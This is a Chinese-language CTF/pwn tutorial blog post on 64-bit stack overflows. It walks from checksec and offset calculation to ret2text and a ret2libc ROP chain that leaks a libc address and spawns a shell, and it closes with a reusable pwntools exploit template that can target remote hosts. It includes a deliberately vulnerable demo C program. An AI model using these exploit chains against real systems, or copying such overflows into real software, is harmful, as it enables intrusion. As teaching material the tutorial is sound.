---
title: "Pwn 入门实战：栈溢出、ret2text 与 ret2libc"
description: "从 checksec 看保护，到 cyclic 算偏移，再到 64 位 ROP 链泄露出 libc 拿 shell，一份可以直接套用的 pwn 笔记。"
pubDate: "Oct 26 2026"
image: /image/image1.webp
categories:
  - Pwn
tags:
  - pwn
badge: Pin
---

栈溢出是 pwn 的起点，也是面试和 CTF 里出现频率最高的一类。这篇把整个流程串起来：从保护检查、偏移计算，到 ret2text 一次打穿，再到 ret2libc 泄露地址。所有命令和模板都可以直接复制改。

## 0. 环境准备

```bash
# pwntools + ROPgadget + gdb(pwndbg)
pip install pwntools
pip install ROPGadget
```

检查二进制的基础信息：

```bash
file ./vuln
checksec ./vuln
```

常见的几项保护含义：

| 保护 | 含义 | 绕过难度 |
| --- | --- | --- |
| NX | 栈不可执行，不能直接跳 shellcode | 中等，改用 ROP |
| Canary | 栈上有随机值，溢出会先被检测 | 需要泄露 canary |
| PIE | 代码段随机化基址 | 需要泄露一个代码地址 |
| Full RELRO | GOT 只读，不能改 GOT | 改用 ROP 而不是 GOT 劫持 |

## 1. 一个最小的演示程序

```c
// vuln.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void win(void) {
    system("/bin/sh");
}

void vuln(void) {
    char buf[0x40];
    puts("input:");
    read(0, buf, 0x100);   // 明显溢出：读 0x100 到 0x40 的缓冲区
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    vuln();
    return 0;
}
```

编译时关掉 Canary 和 PIE，模拟最简单的题目：

```bash
gcc -O0 -fno-stack-protector -no-pie -o vuln vuln.c
checksec --file=./vuln
```

## 2. 算偏移：cyclic 一把梭

偏移 = 栈上缓冲区到返回地址的距离 = `0x40` + 8（64 位下 saved rbp 占 8 字节）= **72**。

不想手算就用 pwntools 的 De Bruijn 序列：

```python
from pwn import *
cyclic(100)                      # 生成特征串 b'aaaabaaacaaa...'
cyclic_find(0x6161616c)          # 用崩溃时的 RIP 值反查偏移
```

在 gdb 里跑崩溃后看 `$rsp`，或用 `corefile` / `dmesg` 里的地址，都是同一个思路。**偏移错了，后面全是白写。**

## 3. ret2text：直接跳到后门函数

程序里自带 `win()`，只要把返回地址覆盖成 `win` 就能拿 shell：

```python
from pwn import *

context(arch="amd64", os="linux", log_level="info")
io = process("./vuln")
elf = ELF("./vuln")

payload = flat({
    72: elf.symbols["win"],
})
io.send(payload)
io.interactive()
```

如果报 `movaps` 相关段错误（常见于 `system()` 内部用到 SSE 指令时栈没对齐），在返回地址前面插一个 `ret` 做 16 字节对齐：

```python
ret = 0x40101a   # 用 ROPgadget 找一个单独的 ret
payload = flat({72: [ret, elf.symbols["win"]]})
```

找 gadget：

```bash
ROPgadget --binary ./vuln --only "pop|ret" | grep -E "pop rdi|: ret"
```

## 4. ret2libc：没有后门怎么办

真实题目里通常没有 `win()`，那就泄露一个 libc 函数地址，算出 libc 基址，再调到 `system("/bin/sh")`。

第一步，用 `pop rdi; ret` 把 `puts@got` 当参数传给 `puts@plt`，打印出真实地址，最后跳回 `vuln` 再打一次：

```python
from pwn import *

context(arch="amd64", os="linux", log_level="debug")
io = process("./vuln")
elf = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

pop_rdi = 0x40101b          # ROPgadget 找到的地址
ret     = 0x40101a

payload = flat({
    72: [
        pop_rdi,
        elf.got["puts"],    # 泄露目标
        elf.plt["puts"],    # 打印 it
        elf.symbols["vuln"],# 再执行一次，为第二次溢出留机会
    ]
})
io.sendline(payload)

leak = u64(io.recvline().strip().ljust(8, b"\x00"))
log.success(f"puts leak: {hex(leak)}")

libc.address = leak - libc.symbols["puts"]
log.success(f"libc base: {hex(libc.address)}")
```

第二步，用算出来的基址构造 `system("/bin/sh")`：

```python
payload = flat({
    72: [
        ret,                        # 对齐
        pop_rdi,
        next(libc.search(b"/bin/sh\x00")),
        libc.symbols["system"],
    ]
})
io.sendline(payload)
io.interactive()
```

`u64(io.recvline().strip().ljust(8, b"\x00"))` 里的 `ljust` 不能省：`puts` 遇到 `\x00` 就停，末尾字节被截掉，补齐 8 字节才能正确解包。

## 5. 一份可复用的 exp 模板

```python
#!/usr/bin/env python3
from pwn import *

BIN = "./vuln"
context(arch="amd64", os="linux", log_level="info")

def start():
    if args.REMOTE:
        host, port = args.HOST or "127.0.0.1", int(args.PORT or 1337)
        return remote(host, port)
    if args.GDB:
        return gdb.debug(BIN, gdbscript="b *vuln+0x0\nc")
    return process(BIN)

elf  = ELF(BIN, checksec=False)
libc = elf.libc          # 远程题目记得换成题目给的 libc.so.6

io = start()

# ---- exploit here ----
payload = flat({72: [elf.symbols["win"]]})
io.send(payload)
io.interactive()
```

`args.REMOTE` / `args.GDB` 是 pwntools 自带的参数解析，`python3 exp.py REMOTE HOST=1.2.3.4 PORT=9999` 就能直接打远程，不用改代码。

## 6. 容易踩的坑

1. **偏移算错**：`read`/`gets` 到 rbp 的距离要按反汇编确认，`char buf[0x40]` 不一定是 0x40。
2. **栈对齐（movaps）**：64 位 `system()` 里常见，插一个 `ret` 解决。
3. **`puts` 泄露被截断**：必须 `ljust(8, b"\x00")`。
4. **libc 版本不匹配**：本地能打通、远程打不通，九成是 libc 不对。用 `libc-database` 或题目给的 `libc.so.6` 反查偏移。
5. **PIE 开着**：`elf.symbols` 变成偏移，需要先泄露一个代码地址再加基址。
6. **Canary**：先泄露 canary（通常配合 `printf` 格式化字符串），溢出时原样写回。

## 小结

栈溢出的固定套路是 **偏移 → 控制返回地址 → 排列参数/gadget**。ret2text 是热身，ret2libc 是真正的日常，再往后就是 `__libc_csu_init`、SROP、ret2dlresolve 这些花活。把这套模板练熟，多数 64 位栈题的框架就固定了。
